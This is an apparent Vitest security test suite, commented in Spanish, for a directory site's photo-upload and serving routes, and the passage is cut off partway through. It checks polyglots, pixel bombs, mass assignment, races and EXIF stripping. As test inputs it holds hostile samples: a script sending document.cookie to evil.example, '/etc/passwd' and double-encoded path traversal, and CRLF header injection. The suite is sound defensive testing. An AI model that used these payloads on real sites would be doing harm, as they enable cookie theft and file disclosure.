import { mkdtemp, readdir, rm, chmod } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

import sharp from "sharp";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("next/headers", async () => {
  const simulado = await import("./admin-mocks");
  return { cookies: simulado.cookies, headers: simulado.headers };
});

import { seedCatalogos } from "../prisma/seed";
import { GET as fotoDelPanel } from "../src/app/admin/foto/[clave]/[variante]/route";
import { GET as fotoPublica } from "../src/app/api/foto/[clave]/[variante]/route";
import type { PrismaClient } from "../src/generated/prisma/client";
import { NOMBRE_COOKIE_SESION, crearValorDeSesion } from "../src/lib/admin/sesion";
import { almacenDeFotos, crearAlmacenLocal, directorioDeFotos } from "../src/lib/fotos/almacen";
import { generarClaveFoto } from "../src/lib/fotos/clave";
import { PARAMETROS_VARIANTES } from "../src/lib/fotos/limites";
import { procesarFoto } from "../src/lib/fotos/procesar";
import { reiniciarLimitePorIp } from "../src/lib/registro/limite-ip";
import { procesarRegistro } from "../src/lib/registro/procesar";
import { MENSAJES_ERROR_FOTO, MENSAJES_ERROR_REGISTRO } from "../src/lib/registro/textos";
import { peticion, reiniciarPeticion } from "./admin-mocks";
import { crearClientePrueba } from "./db";
import { almacenDeMentiras } from "./fotos-fixtures";
import { archivoDeFormulario, jpegConExifYGps, jpegDePrueba } from "./fotos-fixtures";
import { VERSION_AVISO } from "../src/lib/legales/version";
import { CAMPO_VERSION_AVISO } from "../src/lib/registro/textos";

/**
 * Suite adversarial de SEGURIDAD de la foto (etapa C del change
 * `agregar-foto-negocio`). Complementa —no repite— lo que ya cubren
 * `foto-adversarial.test.ts`, `fotos-procesar.test.ts` y `fotos-ruta.test.ts`.
 *
 * Lo que se ataca aquí:
 *
 * 1. Formatos que `sharp` SÍ sabe decodificar pero que la spec no acepta
 *    (GIF, TIFF, AVIF/HEIF): la lista blanca por formato detectado es lo
 *    único que los detiene.
 * 2. Polyglots y archivos rotos: JPEG con HTML pegado detrás, JPEG truncado.
 * 3. Bomba de píxeles DECODIFICABLE (la que pasa el tope de 40 MP), que es el
 *    caso que sí se procesa y sí cuesta memoria.
 * 4. Multipart hostil: campos `foto` repetidos, `foto` que no es un archivo.
 * 5. Carreras: dos envíos simultáneos con foto y dos reenvíos simultáneos.
 * 6. Transiciones ilegales y mass assignment sobre `fotoClave` en el REENVÍO
 *    (el alta ya está cubierta en `registro-adversarial.test.ts`).
 * 7. Las dos rutas de servido: el quinto caso de 404 (publicado sin archivos),
 *    claves con unicode/byte nulo, y Content-Type fijo aunque el almacén
 *    devuelva bytes que no son WebP.
 * 8. `FOTOS_DIR` hostil: inexistente, anidado, sin permiso de escritura.
 *
 * Todos los datos son ficticios (repo público + LFPDPPP): serie 7719998xxx,
 * IPs de TEST-NET-3 (203.0.113.0/24) y coordenadas EXIF inventadas.
 */

const SECRETO = "secreto-de-pruebas-larguisimo-para-firmar-1234567890";
const AHORA = new Date("2026-09-03T12:00:00.000Z");

let prisma: PrismaClient;
let categoriaId: number;
let coloniaId: number;
let jpeg: Buffer;
/** Almacén aislado en un temporal: no comparte archivos con las otras suites. */
let temporal: string;

function formulario(
  whatsapp: string,
  extra: Record<string, string | File> = {},
): FormData {
  const datos = new FormData();
  datos.set("nombre", "Herrería Ficticia Adversarial C");
  datos.set("categoriaId", String(categoriaId));
  datos.set("whatsapp", whatsapp);
  datos.set("coloniaId", String(coloniaId));
  datos.set("consentimiento", "on");
  // Campo oculto con la versión del aviso que pintó el formulario
  // (change `versionar-aviso-privacidad`): sin él, el envío se rechaza.
  datos.set(CAMPO_VERSION_AVISO, VERSION_AVISO);
  for (const [clave, valor] of Object.entries(extra)) datos.set(clave, valor);
  return datos;
}

/** Contexto de registro con el almacén aislado de esta suite. */
function contexto(ip: string, almacen = crearAlmacenLocal(temporal)) {
  return { prisma, ip, ahora: AHORA, almacen };
}

async function archivosDe(directorio: string): Promise<string[]> {
  try {
    return (await readdir(directorio)).sort();
  } catch {
    return [];
  }
}

type ManejadorDeFoto = (
  peticion: Request,
  contexto: { params: Promise<{ clave: string; variante: string }> },
) => Promise<Response>;

function pedir(ruta: ManejadorDeFoto, clave: string, variante: string): Promise<Response> {
  return ruta(new Request("http://localhost/foto"), {
    params: Promise.resolve({ clave, variante }),
  });
}

/** Todo lo observable de una respuesta, para poder compararlas byte a byte. */
async function huella(respuesta: Response) {
  return {
    status: respuesta.status,
    cabeceras: [...respuesta.headers.entries()].sort(),
    cuerpo: Buffer.from(await respuesta.arrayBuffer()).toString("base64"),
  };
}

beforeAll(async () => {
  process.env.PANEL_CONTRASENA = "contrasena-de-pruebas-larga-y-fea";
  process.env.PANEL_SESION_SECRETO = SECRETO;

  prisma = crearClientePrueba();
  await seedCatalogos(prisma);
  categoriaId = (
    await prisma.categoria.findUniqueOrThrow({ where: { slug: "talleres" } })
  ).id;
  coloniaId = (
    await prisma.colonia.findUniqueOrThrow({ where: { slug: "huicalco" } })
  ).id;
  jpeg = await jpegDePrueba(900, 700);
  temporal = await mkdtemp(path.join(tmpdir(), "fotos-adv-c-"));
});

afterAll(async () => {
  await prisma.negocio.deleteMany({ where: { whatsapp: { startsWith: "7719998" } } });
  await prisma.$disconnect();
  await rm(temporal, { recursive: true, force: true });
});

beforeEach(async () => {
  reiniciarLimitePorIp();
  reiniciarPeticion();
  await prisma.negocio.deleteMany({ where: { whatsapp: { startsWith: "7719998" } } });
});

// ───────────────────────────────────────────────────────────────────────────
// 1. Formatos que sharp decodifica pero la spec no acepta
// ───────────────────────────────────────────────────────────────────────────

describe("la lista blanca es por formato DETECTADO, no por lo que se pueda abrir", () => {
  // `sharp` sabe leer GIF, TIFF y AVIF/HEIF perfectamente: si el filtro fuera
  // "¿se puede decodificar?" en vez de "¿es JPG/PNG/WebP?", los tres entrarían
  // y se guardarían variantes de formatos que la política del PRD §6.1 no
  // menciona. Ninguno de los tres estaba probado.
  it.each([["gif"], ["tiff"], ["avif"]])(
    "un %s válido y decodificable se rechaza como 'no es imagen'",
    async (formato) => {
      const bytes = await sharp({
        create: { width: 320, height: 240, channels: 3, background: { r: 20, g: 90, b: 140 } },
      })
        .toFormat(formato as "gif" | "tiff" | "avif")
        .toBuffer();

      // La fixture es de verdad ese formato (si no, el test no probaría nada).
      const detectado = (await sharp(bytes).metadata()).format;
      expect(["gif", "tiff", "heif"]).toContain(detectado);

      expect(await procesarFoto(bytes)).toEqual({ ok: false, motivo: "noEsImagen" });
    },
  );

  it("un GIF renombrado y declarado como image/jpeg tampoco entra ni deja archivos", async () => {
    const gif = await sharp({
      create: { width: 200, height: 200, channels: 3, background: { r: 1, g: 2, b: 3 } },
    })
      .gif()
      .toBuffer();

    const antes = await archivosDe(temporal);
    const resultado = await procesarRegistro(
      formulario("7719998001", { foto: archivoDeFormulario(gif, "foto.jpg", "image/jpeg") }),
      contexto("203.0.113.61"),
    );

    expect(resultado).toEqual({
      exito: false,
      estado: expect.objectContaining({
        errores: expect.objectContaining({ foto: MENSAJES_ERROR_FOTO.noEsImagen }),
      }),
    });
    expect(await archivosDe(temporal)).toEqual(antes);
    expect(await prisma.negocio.count({ where: { whatsapp: "7719998001" } })).toBe(0);
  });
});

// ───────────────────────────────────────────────────────────────────────────
// 2. Polyglots y archivos rotos
// ───────────────────────────────────────────────────────────────────────────

describe("polyglots y archivos rotos", () => {
  // El polyglot clásico: bytes JPEG válidos con un documento HTML pegado
  // detrás. `sharp` lo abre como JPEG (así que ENTRA), y lo que hay que
  // comprobar es que lo que se guarda y se sirve es una reconstrucción
  // limpia: ni un byte del HTML sobrevive a la recompresión.
  it("un JPEG con HTML pegado detrás entra, pero el HTML no sobrevive a ninguna variante", async () => {
    const cargaUtil = Buffer.from(
      "<html><script>document.location='//evil.example/'+document.cookie</script></html>",
      "utf8",
    );
    const polyglot = Buffer.concat([jpeg, cargaUtil]);

    const procesada = await procesarFoto(polyglot);
    if (!procesada.ok) throw new Error("el polyglot es un JPEG válido: debía aceptarse");

    for (const [nombre, variante] of Object.entries(procesada.variantes)) {
      // Cabecera RIFF/WEBP de verdad, no "lo que llegó".
      expect(variante.subarray(0, 4).toString("latin1"), nombre).toBe("RIFF");
      expect(variante.subarray(8, 12).toString("latin1"), nombre).toBe("WEBP");
      expect(variante.includes(cargaUtil), nombre).toBe(false);
      expect(variante.includes(Buffer.from("<script>")), nombre).toBe(false);
      expect(variante.includes(Buffer.from("evil.example")), nombre).toBe(false);
    }
  });

  // Cabecera intacta, píxeles a medias: pasa la inspección y truena al
  // comprimir. Es el camino del `catch` de `procesarFoto`, y lo que importa es
  // que salga por el mensaje de la spec y no como excepción hacia el framework.
  it("un JPEG truncado se rechaza con el literal del servidor, sin 500 y sin archivos", async () => {
    const truncado = jpeg.subarray(0, Math.floor(jpeg.length * 0.4));

    // La cabecera sigue siendo legible: el rechazo no viene de la inspección.
    expect((await sharp(truncado).metadata()).format).toBe("jpeg");

    const antes = await archivosDe(temporal);
    const resultado = await procesarRegistro(
      formulario("7719998002", {
        foto: archivoDeFormulario(truncado, "media-foto.jpg", "image/jpeg"),
      }),
      contexto("203.0.113.62"),
    );

    if (resultado.exito) throw new Error("un JPEG truncado no es una foto utilizable");
    const mensaje = resultado.estado.errores.foto;
    expect(Object.values(MENSAJES_ERROR_FOTO)).toContain(mensaje);
    // Ningún detalle técnico del archivo ni del error llega al dueño.
    for (const filtracion of ["JPEG", "jpeg", "VipsJpeg", "premature", "Error", "sharp"]) {
      expect(mensaje).not.toContain(filtracion);
    }
    expect(await archivosDe(temporal)).toEqual(antes);
    expect(await prisma.negocio.count({ where: { whatsapp: "7719998002" } })).toBe(0);
  });
});

// ───────────────────────────────────────────────────────────────────────────
// 3. Bomba de píxeles DECODIFICABLE
// ───────────────────────────────────────────────────────────────────────────

describe("bomba de píxeles que sí pasa el tope de 40 MP", () => {
  // La fixture del dev (`pngBombaDePixeles`) declara 108 MP y por eso se
  // rechaza. Esta es la otra mitad del problema: un PNG plano de ~120 KB con
  // 39.4 MP —justo POR DEBAJO del tope— es una entrada VÁLIDA que el servidor
  // acepta y decodifica entera. El test fija el comportamiento (se acepta y
  // cumple presupuesto) y deja constancia de cuánto trabajo compra un envío
  // de kilobytes. El costo agregado va como hallazgo en el reporte.
  it("un PNG plano de 39.4 MP y ~120 KB se acepta y se procesa entero", async () => {
    const bomba = await sharp({
      create: { width: 7300, height: 5400, channels: 3, background: { r: 120, g: 130, b: 140 } },
    })
      .png()
      .toBuffer();

    // Chica en bytes, enorme en píxeles: ese es justo el ataque barato.
    expect(bomba.length).toBeLessThan(1024 * 1024);
    expect(7300 * 5400).toBeLessThan(40 * 1_000_000);

    const procesada = await procesarFoto(bomba);
    if (!procesada.ok) throw new Error("39.4 MP está bajo el tope: debe aceptarse");
    expect(procesada.variantes.tarjeta.length).toBeLessThanOrEqual(
      PARAMETROS_VARIANTES.tarjeta.pesoMaximo,
    );
    expect(procesada.variantes.ficha.length).toBeLessThanOrEqual(
      PARAMETROS_VARIANTES.ficha.pesoMaximo,
    );
  });
});

// ───────────────────────────────────────────────────────────────────────────
// 4. Multipart hostil
// ───────────────────────────────────────────────────────────────────────────

describe("multipart hostil: campos repetidos y valores que no son archivo", () => {
  // "Se queda con la PRIMERA imagen": si el primero es hostil, el envío se
  // rechaza. Colar un HTML delante de un JPG bueno no debe hacer que el
  // servidor "se caiga" al segundo y acabe aceptando el envío.
  it("con un HTML primero y un JPG después, se rechaza: no se cae al segundo", async () => {
    const datos = formulario("7719998010");
    datos.delete("foto");
    datos.append(
      "foto",
      archivoDeFormulario(Buffer.from("<html>no soy una foto</html>"), "a.jpg", "image/jpeg"),
    );
    datos.append("foto", archivoDeFormulario(jpeg, "b.jpg", "image/jpeg"));

    const antes = await archivosDe(temporal);
    const resultado = await procesarRegistro(datos, contexto("203.0.113.63"));

    if (resultado.exito) throw new Error("el primer archivo manda y no era una imagen");
    expect(resultado.estado.errores.foto).toBe(MENSAJES_ERROR_FOTO.noEsImagen);
    expect(await archivosDe(temporal)).toEqual(antes);
    expect(await prisma.negocio.count({ where: { whatsapp: "7719998010" } })).toBe(0);
  });

  it("con un JPG primero y un HTML después, solo se guarda el primero", async () => {
    const datos = formulario("7719998011");
    datos.delete("foto");
    datos.append("foto", archivoDeFormulario(jpeg, "b.jpg", "image/jpeg"));
    datos.append(
      "foto",
      archivoDeFormulario(Buffer.from("<html>no soy una foto</html>"), "a.jpg", "image/jpeg"),
    );

    const resultado = await procesarRegistro(datos, contexto("203.0.113.64"));
    expect(resultado).toEqual({ exito: true });

    const creado = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719998011" },
    });
    expect(creado.fotoClave).toMatch(/^[0-9a-f]{32}$/);
    // Exactamente dos archivos: una sola foto por ficha, pase lo que pase.
    const suyos = (await archivosDe(temporal)).filter((a) => a.startsWith(creado.fotoClave!));
    expect(suyos).toHaveLength(2);
  });

  // Un POST crudo puede mandar `foto` como texto en vez de como archivo.
  it.each([
    ["texto plano", "/etc/passwd", "7719998020", "203.0.113.71"],
    [
      "ruta del almacén",
      "../../.fotos-test/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.ficha.webp",
      "7719998021",
      "203.0.113.72",
    ],
    ["clave con forma válida", "0123456789abcdef0123456789abcdef", "7719998022", "203.0.113.73"],
  ])("el campo foto como %s se trata como 'sin foto', no como referencia", async (
    _caso,
    valor,
    numero,
    ip,
  ) => {
    const datos = formulario(numero);
    datos.set("foto", valor);

    const resultado = await procesarRegistro(datos, contexto(ip));
    expect(resultado).toEqual({ exito: true });

    const creado = await prisma.negocio.findUniqueOrThrow({ where: { whatsapp: numero } });
    expect(creado.fotoClave).toBeNull();
  });
});

// ───────────────────────────────────────────────────────────────────────────
// 5. Carreras
// ───────────────────────────────────────────────────────────────────────────

describe("carreras: dos envíos simultáneos no dejan huérfanos", () => {
  it("doble alta simultánea con foto para el mismo número deja una ficha y dos archivos", async () => {
    const antes = await archivosDe(temporal);

    const [a, b] = await Promise.all([
      procesarRegistro(
        formulario("7719998030", { foto: archivoDeFormulario(jpeg, "a.jpg") }),
        contexto("203.0.113.81"),
      ),
      procesarRegistro(
        formulario("7719998030", { foto: archivoDeFormulario(jpeg, "b.jpg") }),
        contexto("203.0.113.82"),
      ),
    ]);

    // Uno gana; el otro ve el mensaje de número duplicado, nunca un error técnico.
    const exitos = [a, b].filter((r) => r.exito).length;
    expect(exitos).toBe(1);
    const perdedor = [a, b].find((r) => !r.exito);
    if (perdedor && !perdedor.exito) {
      expect(perdedor.estado.errores.whatsapp).toBe(
        MENSAJES_ERROR_REGISTRO.whatsappDuplicado,
      );
    }

    expect(await prisma.negocio.count({ where: { whatsapp: "7719998030" } })).toBe(1);
    const creado = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719998030" },
    });

    // Ni un archivo de más: solo las dos variantes de la clave que quedó.
    const nuevos = (await archivosDe(temporal)).filter((a) => !antes.includes(a));
    expect(nuevos.sort()).toEqual(
      [`${creado.fotoClave}.ficha.webp`, `${creado.fotoClave}.tarjeta.webp`].sort(),
    );
  });

  it("doble reenvío simultáneo sobre una ficha rechazada deja una sola foto viva", async () => {
    const claveVieja = generarClaveFoto();
    const almacen = crearAlmacenLocal(temporal);
    await almacen.guardar(claveVieja, "tarjeta", Buffer.from("vieja tarjeta"));
    await almacen.guardar(claveVieja, "ficha", Buffer.from("vieja ficha"));
    await prisma.negocio.create({
      data: {
        nombre: "Vulcanizadora Ficticia Rechazada",
        categoriaId,
        coloniaId,
        whatsapp: "7719998031",
        estado: "rechazado",
        rechazadoEn: AHORA,
        motivoRechazo: "motivo de mentiras",
        consintioAvisoEn: AHORA,
        fotoClave: claveVieja,
      },
    });
    const antes = await archivosDe(temporal);

    await Promise.all([
      procesarRegistro(
        formulario("7719998031", { foto: archivoDeFormulario(jpeg, "nueva-a.jpg") }),
        contexto("203.0.113.83", almacen),
      ),
      procesarRegistro(
        formulario("7719998031", { foto: archivoDeFormulario(jpeg, "nueva-b.jpg") }),
        contexto("203.0.113.84", almacen),
      ),
    ]);

    const ficha = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719998031" },
    });
    // Un reenvío devuelve la ficha a la cola: JAMÁS la publica.
    expect(ficha.estado).toBe("en_revision");
    expect(ficha.fotoClave).toMatch(/^[0-9a-f]{32}$/);

    const despues = await archivosDe(temporal);
    // La foto que quedó apuntada existe...
    expect(despues).toContain(`${ficha.fotoClave}.tarjeta.webp`);
    expect(despues).toContain(`${ficha.fotoClave}.ficha.webp`);
    // ...la anterior se borró de verdad...
    expect(despues).not.toContain(`${claveVieja}.tarjeta.webp`);
    expect(despues).not.toContain(`${claveVieja}.ficha.webp`);
    // ...y del reenvío perdedor no quedó ningún archivo suelto.
    const sobrantes = despues.filter(
      (archivo) => !antes.includes(archivo) && !archivo.startsWith(ficha.fotoClave!),
    );
    expect(sobrantes).toEqual([]);
  });
});

// ───────────────────────────────────────────────────────────────────────────
// 6. Transiciones ilegales y mass assignment en el reenvío
// ───────────────────────────────────────────────────────────────────────────

describe("transiciones ilegales y referencia de foto impuesta por el cliente", () => {
  async function fichaRechazadaConFoto(whatsapp: string, almacen = crearAlmacenLocal(temporal)) {
    const clave = generarClaveFoto();
    await almacen.guardar(clave, "tarjeta", Buffer.from("tarjeta de mentiras"));
    await almacen.guardar(clave, "ficha", Buffer.from("ficha de mentiras"));
    await prisma.negocio.create({
      data: {
        nombre: "Cerrajería Ficticia Rechazada",
        categoriaId,
        coloniaId,
        whatsapp,
        estado: "rechazado",
        rechazadoEn: AHORA,
        motivoRechazo: "motivo de mentiras",
        consintioAvisoEn: AHORA,
        fotoClave: clave,
      },
    });
    return clave;
  }

  // `rechazado → publicado` sin pasar por el panel: el reenvío es la única
  // escritura pública sobre una ficha existente, así que es por donde se
  // intentaría.
  it("un reenvío que pide estado publicado vuelve a en_revision, no se autopublica", async () => {
    await fichaRechazadaConFoto("7719998040");

    const resultado = await procesarRegistro(
      formulario("7719998040", {
        estado: "publicado",
        publicadoEn: AHORA.toISOString(),
        origen: "curado",
        foto: archivoDeFormulario(jpeg, "nueva.jpg"),
      }),
      contexto("203.0.113.85"),
    );

    expect(resultado).toEqual({ exito: true });
    const ficha = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719998040" },
    });
    expect(ficha.estado).toBe("en_revision");
    expect(ficha.publicadoEn).toBeNull();
    expect(ficha.origen).toBe("organico");
  });

  // Mass assignment sobre la columna de la foto EN EL REENVÍO: el alta ya está
  // cubierta, pero el reenvío escribe sobre una fila que ya existe, así que un
  // `fotoClave` aceptado ahí serviría para apuntar la ficha propia a los
  // archivos de OTRO negocio (o para dejarla apuntando a cualquier cosa).
  it("un reenvío no puede fijar fotoClave ni apuntar a la foto de otro negocio", async () => {
    const claveAjena = generarClaveFoto();
    await prisma.negocio.create({
      data: {
        nombre: "Tortillería Ficticia Publicada",
        categoriaId,
        coloniaId,
        whatsapp: "7719998041",
        estado: "publicado",
        publicadoEn: AHORA,
        consintioAvisoEn: AHORA,
        fotoClave: claveAjena,
      },
    });
    const clavePropia = await fichaRechazadaConFoto("7719998042");

    const resultado = await procesarRegistro(
      formulario("7719998042", {
        fotoClave: claveAjena,
        fotoUrl: "https://evil.example/pixel.png",
        foto_clave: claveAjena,
      }),
      contexto("203.0.113.86"),
    );

    expect(resultado).toEqual({ exito: true });
    const ficha = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719998042" },
    });
    // Ni robó la ajena ni cambió la suya: sin archivo y sin casilla, la
    // columna no se toca.
    expect(ficha.fotoClave).toBe(clavePropia);
    expect(ficha.fotoClave).not.toBe(claveAjena);

    const ajena = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719998041" },
    });
    expect(ajena.fotoClave).toBe(claveAjena);
  });

  it("marcar 'quitar foto' con un fotoClave inventado deja la ficha sin foto, no con la inventada", async () => {
    await fichaRechazadaConFoto("7719998043");

    await procesarRegistro(
      formulario("7719998043", {
        quitarFoto: "on",
        fotoClave: "ffffffffffffffffffffffffffffffff",
      }),
      contexto("203.0.113.87"),
    );

    const ficha = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719998043" },
    });
    expect(ficha.fotoClave).toBeNull();
  });
});

// ───────────────────────────────────────────────────────────────────────────
// 7. Las dos rutas de servido
// ───────────────────────────────────────────────────────────────────────────

describe("rutas de servido: nada distingue un 404 de otro", () => {
  const creadas: string[] = [];

  async function sembrarFoto(
    whatsapp: string,
    estado: string,
    bytes = Buffer.from("bytes de mentiras"),
    conArchivos = true,
  ): Promise<string> {
    const clave = generarClaveFoto();
    await prisma.negocio.create({
      data: {
        nombre: "Estética Ficticia de Rutas",
        categoriaId,
        coloniaId,
        whatsapp,
        estado,
        consintioAvisoEn: AHORA,
        fotoClave: clave,
        ...(estado === "publicado" ? { publicadoEn: AHORA } : {}),
      },
    });
    if (conArchivos) {
      await almacenDeFotos().guardar(clave, "tarjeta", bytes);
      await almacenDeFotos().guardar(clave, "ficha", bytes);
      creadas.push(clave);
    }
    return clave;
  }

  afterAll(async () => {
    for (const clave of creadas) await almacenDeFotos().borrar(clave);
  });

  // El quinto caso, que faltaba: la ficha ESTÁ publicada y la clave ES la
  // suya, pero los archivos ya no están en el almacén (borrado a medias,
  // filesystem efímero de un deploy serverless, purga manual). Tiene que ser
  // indistinguible de los otros cuatro o delata "esta ficha existe y está
  // publicada, solo que sin bytes".
  it("publicado con los archivos ausentes da exactamente el mismo 404 que una clave inventada", async () => {
    const sinArchivos = await sembrarFoto(
      "7719998050",
      "publicado",
      Buffer.alloc(0),
      false,
    );
    const enRevision = await sembrarFoto("7719998051", "en_revision");

    const huellas = await Promise.all([
      pedir(fotoPublica, sinArchivos, "ficha").then(huella),
      pedir(fotoPublica, enRevision, "ficha").then(huella),
      pedir(fotoPublica, generarClaveFoto(), "ficha").then(huella),
      pedir(fotoPublica, "no-es-una-clave", "ficha").then(huella),
    ]);

    expect(huellas[0].status).toBe(404);
    expect(huellas[0].cuerpo).toBe("");
    for (const otra of huellas.slice(1)) expect(otra).toEqual(huellas[0]);
  });

  it.each([
    ["byte nulo dentro de la clave", "0123456789abcdef0123456789abcde\u0000"],
    ["byte nulo pegado al final", "0123456789abcdef0123456789abcdef\u0000"],
    ["dígitos de ancho completo", "０１２３４５６７８９abcdef0123456789abcdef"],
    ["homoglifo cirílico", "0123456789аbcdef0123456789abcdef"],
    ["separadores unicode", "0123456789abcdef⁄..⁄passwd"],
    ["salto de línea (inyección de cabeceras)", "0123456789abcdef\r\nX-Inyectada: si"],
    ["doble codificación", "%252e%252e%252fetc%252fpasswd"],
    ["clave enorme", "a".repeat(20000)],
    ["solo espacios", "   "],
    ["cadena vacía", ""],
  ])("clave hostil (%s): 404 sin tocar la base ni el almacén", async (_caso, clave) => {
    let lecturas = 0;
    let consultas = 0;
    const almacenEspia = almacenDeMentiras({
      leer: async () => {
        lecturas++;
        return null;
      },
    });
    // Espías sobre las DOS cosas que la clave hostil no debe llegar a tocar:
    // el disco y la base. Que no llegue al disco lo garantizaría por sí sola
    // la consulta fallida; que no llegue siquiera a la base es lo que promete
    // `servirFoto` ("ni se consulta la base con algo que el servidor nunca
    // pudo haber escrito") y es lo que evita convertir la ruta pública en un
    // generador de consultas con texto arbitrario del cliente.
    const prismaEspia = {
      negocio: {
        async findFirst() {
          consultas++;
          return null;
        },
      },
    };
    const { servirFoto } = await import("../src/lib/fotos/servir");
    const respuesta = await servirFoto({
      clave,
      variante: "ficha",
      prisma: prismaEspia,
      almacen: almacenEspia,
    });

    expect(respuesta.status, _caso).toBe(404);
    expect(consultas, _caso).toBe(0);
    expect(lecturas, _caso).toBe(0);
    // Nada de lo que mandó el cliente vuelve en las cabeceras.
    for (const [nombre, valor] of respuesta.headers.entries()) {
      expect(nombre.toLowerCase()).not.toContain("inyectada");
      expect(valor).not.toContain("passwd");
    }
  });

  // Si el almacén devolviera bytes que no son WebP (adaptador futuro, archivo
  // manipulado, migración), la respuesta NO debe volverse interpretable: el
  // Content-Type lo fija el servidor, no el contenido.
  it("aunque el almacén devuelva HTML, se sirve como image/webp y con nosniff", async () => {
    const clave = await sembrarFoto(
      "7719998052",
      "publicado",
      Buffer.from("<html><script>alert(1)</script></html>"),
    );

    const respuesta = await pedir(fotoPublica, clave, "tarjeta");
    expect(respuesta.status).toBe(200);
    expect(respuesta.headers.get("content-type")).toBe("image/webp");
    expect(respuesta.headers.get("x-content-type-options")).toBe("nosniff");
    // Ninguna cabecera invita al navegador a tratar esto como documento.
    const cabeceras = [...respuesta.headers.keys()].map((n) => n.toLowerCase());
    expect(cabeceras).not.toContain("content-security-policy-report-only");
    for (const [, valor] of respuesta.headers.entries()) {
      expect(valor).not.toContain("text/html");
    }
  });

  // Despublicar tiene que cortar el servicio en la MISMA clave y de inmediato:
  // si el servidor guardara algo en memoria, la foto seguiría saliendo.
  it("despublicar deja de servir la foto en la misma clave, sin reiniciar nada", async () => {
    const clave = await sembrarFoto("7719998053", "publicado");
    expect((await pedir(fotoPublica, clave, "ficha")).status).toBe(200);

    await prisma.negocio.update({
      where: { whatsapp: "7719998053" },
      data: { estado: "rechazado", rechazadoEn: AHORA, motivoRechazo: "de mentiras" },
    });

    expect((await pedir(fotoPublica, clave, "ficha")).status).toBe(404);
    // Y tampoco por la ruta del panel sin sesión.
    expect((await pedir(fotoDelPanel, clave, "ficha")).status).toBe(404);
  });

  it("la cookie del panel sirve la foto del panel pero nunca amplía la ruta pública", async () => {
    const clave = await sembrarFoto("7719998054", "en_revision");

    peticion.cookies[NOMBRE_COOKIE_SESION] = crearValorDeSesion(SECRETO);
    expect((await pedir(fotoDelPanel, clave, "ficha")).status).toBe(200);
    expect((await pedir(fotoPublica, clave, "ficha")).status).toBe(404);

    // Una cookie con el mismo formato pero firmada con otro secreto no abre nada.
    peticion.cookies[NOMBRE_COOKIE_SESION] = crearValorDeSesion("otro-secreto-igual-de-largo-pero-ajeno");
    expect((await pedir(fotoDelPanel, clave, "ficha")).status).toBe(404);
  });
});

describe("las claves no son enumerables", () => {
  // 32 hex es la FORMA; lo que importa es que detrás haya 128 bits de un CSPRNG.
  it("2000 claves seguidas son únicas y cada bit cae ~50/50", () => {
    const total = 2000;
    const claves = new Set<string>();
    const unos = new Array(128).fill(0);

    for (let i = 0; i < total; i++) {
      const clave = generarClaveFoto();
      expect(clave).toMatch(/^[0-9a-f]{32}$/);
      claves.add(clave);
      for (let nibble = 0; nibble < 32; nibble++) {
        const valor = parseInt(clave[nibble], 16);
        for (let bit = 0; bit < 4; bit++) {
          if (valor & (1 << bit)) unos[nibble * 4 + bit]++;
        }
      }
    }

    expect(claves.size).toBe(total);
    // Un generador degenerado (contador, timestamp, prefijo fijo) tendría bits
    // pegados a 0 o a 1; con 2000 muestras el margen es holgadísimo.
    for (const [posicion, cuenta] of unos.entries()) {
      expect(cuenta / total, `bit ${posicion}`).toBeGreaterThan(0.35);
      expect(cuenta / total, `bit ${posicion}`).toBeLessThan(0.65);
    }
  });
});

// ───────────────────────────────────────────────────────────────────────────
// 8. EXIF / GPS end-to-end
// ───────────────────────────────────────────────────────────────────────────

describe("el GPS del celular no sobrevive hasta lo que se sirve por HTTP", () => {
  // El dev comprueba los metadatos a la salida de `procesarFoto`. Esto lo
  // comprueba en el último eslabón: los bytes que salen por la ruta pública,
  // después de pasar por el almacén, en LAS DOS variantes.
  it("ninguna de las dos variantes servidas contiene EXIF, GPS ni el modelo del celular", async () => {
    const conGps = await jpegConExifYGps();
    // La fixture SÍ trae lo que hay que borrar (si no, el test no probaría nada).
    expect(conGps.includes(Buffer.from("MarcaFicticia"))).toBe(true);
    expect(conGps.includes(Buffer.from("Exif\u0000\u0000", "latin1"))).toBe(true);

    const resultado = await procesarRegistro(
      formulario("7719998060", { foto: archivoDeFormulario(conGps, "celular.jpg") }),
      contexto("203.0.113.90", almacenDeFotos()),
    );
    expect(resultado).toEqual({ exito: true });

    const negocio = await prisma.negocio.findUniqueOrThrow({
      where: { whatsapp: "7719998060" },
    });
    await prisma.negocio.update({
      where: { id: negocio.id },
      data: { estado: "publicado", publicadoEn: AHORA },
    });

    try {
      for (const variante of ["tarjeta", "ficha"] as const) {
        const respuesta = await pedir(fotoPublica, negocio.fotoClave!, variante);
        expect(respuesta.status, variante).toBe(200);
        const bytes = Buffer.from(await respuesta.arrayBuffer());

        expect(bytes.subarray(0, 4).toString("latin1"), variante).toBe("RIFF");
        for (const rastro of [
          "MarcaFicticia",
          "ModeloDeMentiras",
          "GPSLatitude",
          "GPSLongitude",
          "2026:09:01",
        ]) {
          expect(bytes.includes(Buffer.from(rastro)), `${variante}/${rastro}`).toBe(false);
        }
        // Ni el bloque EXIF crudo ni el chunk EXIF de WebP.
        expect(bytes.includes(Buffer.from("Exif\u0000\u0000", "latin1")), variante).toBe(false);
        expect(bytes.includes(Buffer.from("EXIF", "latin1")), variante).toBe(false);
      }
    } finally {
      await almacenDeFotos().borrar(negocio.fotoClave!);
    }
  });
});

// ───────────────────────────────────────────────────────────────────────────
// 9. FOTOS_DIR hostil
// ───────────────────────────────────────────────────────────────────────────

describe("FOTOS_DIR hostil o roto no se convierte en un 500 crudo", () => {
  it("un directorio que todavía no existe (anidado) se crea al primer guardado", async () => {
    const anidado = path.join(temporal, "no", "existe", "todavia");
    const almacen = crearAlmacenLocal(anidado);
    const clave = generarClaveFoto();

    await expect(almacen.guardar(clave, "ficha", Buffer.from("x"))).resolves.toBeUndefined();
    expect(await almacen.leer(clave, "ficha")).toEqual(Buffer.from("x"));
  });

  // Fail-safe: si el almacén no puede escribir, el dueño ve el literal de la
  // spec, no una excepción que suba al framework como error 500 con traza.
